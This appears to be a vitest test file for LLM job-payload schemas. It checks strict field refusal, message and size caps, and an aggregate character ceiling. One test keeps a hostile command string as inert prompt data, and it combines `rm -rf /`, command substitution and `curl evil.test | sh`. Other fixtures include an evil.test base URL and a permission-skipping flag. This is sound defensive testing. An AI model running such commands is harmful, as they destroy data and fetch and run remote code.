import { describe, expect, it } from "vitest";
import {
  ChatPayload,
  GeneratePayload,
  isJobKind,
  JOB_KINDS,
  KindedPayload,
  PAYLOAD_LIMITS,
  payloadTextLength,
} from "./kinds.js";

describe("job kinds", () => {
  it("recognises exactly the v1 kinds", () => {
    expect([...JOB_KINDS]).toEqual(["llm.generate", "llm.chat"]);
    expect(isJobKind("llm.generate")).toBe(true);
    expect(isJobKind("llm.exec")).toBe(false);
    expect(isJobKind("")).toBe(false);
  });
});

describe("GeneratePayload — data, never configuration", () => {
  it("accepts a plain prompt", () => {
    const parsed = GeneratePayload.parse({ prompt: "hello" });
    expect(parsed.prompt).toBe("hello");
  });

  it("keeps hostile-looking text verbatim — it is just characters", () => {
    const hostile = "$(rm -rf /) `id` && curl evil.test | sh\n--allowedTools";
    expect(GeneratePayload.parse({ prompt: hostile }).prompt).toBe(hostile);
  });

  it.each([
    ["model", { prompt: "hi", model: "gpt-4" }],
    ["backend", { prompt: "hi", backend: "openai-http" }],
    ["baseUrl", { prompt: "hi", baseUrl: "http://evil.test" }],
    ["args", { prompt: "hi", args: ["--dangerously-skip-permissions"] }],
    ["tools", { prompt: "hi", tools: ["Bash"] }],
    ["cwd", { prompt: "hi", cwd: "/etc" }],
    ["env", { prompt: "hi", env: { ANTHROPIC_API_KEY: "x" } }],
  ])("refuses a payload carrying %s", (_name, payload) => {
    // byollm_004 §2 / MUSTS.NO_PAYLOAD_ROUTING: there is no field to carry
    // routing, and `.strict()` means an unknown one is a parse failure rather
    // than something quietly ignored deeper in.
    expect(GeneratePayload.safeParse(payload).success).toBe(false);
  });

  it("refuses an empty prompt and an oversized one", () => {
    expect(GeneratePayload.safeParse({ prompt: "" }).success).toBe(false);
    expect(
      GeneratePayload.safeParse({
        prompt: "x".repeat(PAYLOAD_LIMITS.maxTextChars + 1),
      }).success,
    ).toBe(false);
  });
});

describe("ChatPayload", () => {
  it("accepts a conversation", () => {
    const parsed = ChatPayload.parse({
      messages: [
        { role: "user", content: "hi" },
        { role: "assistant", content: "hello" },
      ],
    });
    expect(parsed.messages).toHaveLength(2);
  });

  it("refuses an unknown role", () => {
    expect(
      ChatPayload.safeParse({ messages: [{ role: "tool", content: "x" }] })
        .success,
    ).toBe(false);
  });

  it("refuses an empty conversation and one past the message cap", () => {
    expect(ChatPayload.safeParse({ messages: [] }).success).toBe(false);
    expect(
      ChatPayload.safeParse({
        messages: Array.from(
          { length: PAYLOAD_LIMITS.maxMessages + 1 },
          () => ({ role: "user" as const, content: "x" }),
        ),
      }).success,
    ).toBe(false);
  });
});

describe("payloadTextLength", () => {
  it("counts a generate payload with its system text", () => {
    const kinded = KindedPayload.parse({
      kind: "llm.generate",
      payload: { prompt: "12345", system: "123" },
    });
    expect(payloadTextLength(kinded)).toBe(8);
  });

  it("counts every message of a chat payload", () => {
    const kinded = KindedPayload.parse({
      kind: "llm.chat",
      payload: {
        messages: [
          { role: "user", content: "12" },
          { role: "assistant", content: "345" },
        ],
        system: "6",
      },
    });
    expect(payloadTextLength(kinded)).toBe(6);
  });
});

describe("the aggregate ceiling — cloud_008 finding 30", () => {
  /**
   * `maxTotalChars` was declared and referenced nowhere, under a docstring
   * saying the schema enforced these limits. Two of the three were real.
   *
   * The per-field limits multiply: 256 messages at a million characters each
   * is 256M, sixty-four times the ceiling the same object states, and every
   * one of them parsed. Nothing downstream re-checked it — the daemon's budget
   * check applies *stricter* community limits on top and reads this as the
   * floor it never has to verify.
   */
  it("refuses a chat payload over the total, one message at a time", () => {
    const messages = Array.from({ length: 200 }, () => ({
      role: "user" as const,
      // Each well under `maxTextChars`, so every field-level limit passes.
      content: "x".repeat(30_000),
    }));
    expect(ChatPayload.safeParse({ messages }).success).toBe(false);
  });

  it("accepts one just under it", () => {
    // The positive control: a ceiling that refuses everything would pass the
    // test above and break every real job.
    const messages = Array.from({ length: 3 }, () => ({
      role: "user" as const,
      content: "x".repeat(1_000_000),
    }));
    expect(ChatPayload.safeParse({ messages }).success).toBe(true);
  });

  it("counts the system prompt toward the total", () => {
    // A field that is checked on its own and forgotten in the sum is how an
    // aggregate limit gets quietly reintroduced.
    expect(
      ChatPayload.safeParse({
        messages: [{ role: "user", content: "x".repeat(3_500_000) }],
        system: "y".repeat(600_000),
      }).success,
    ).toBe(false);
  });

  it("cannot be reached by a generate payload, which is worth stating", () => {
    // Two fields at `maxTextChars` is 2M, half the aggregate ceiling — so on
    // this kind the check can never fire, and the refinement is there for the
    // shape rather than for the bound.
    //
    // Said out loud because the alternative is a test named "refuses a
    // generate payload over the total" that asserts `true` and reads as
    // coverage. The multiplication only bites where a *count* limit meets a
    // per-item limit, which is `llm.chat`.
    expect(
      GeneratePayload.safeParse({
        prompt: "x".repeat(PAYLOAD_LIMITS.maxTextChars),
        system: "y".repeat(PAYLOAD_LIMITS.maxTextChars),
      }).success,
    ).toBe(true);
    expect(PAYLOAD_LIMITS.maxTextChars * 2).toBeLessThan(
      PAYLOAD_LIMITS.maxTotalChars,
    );
  });
});
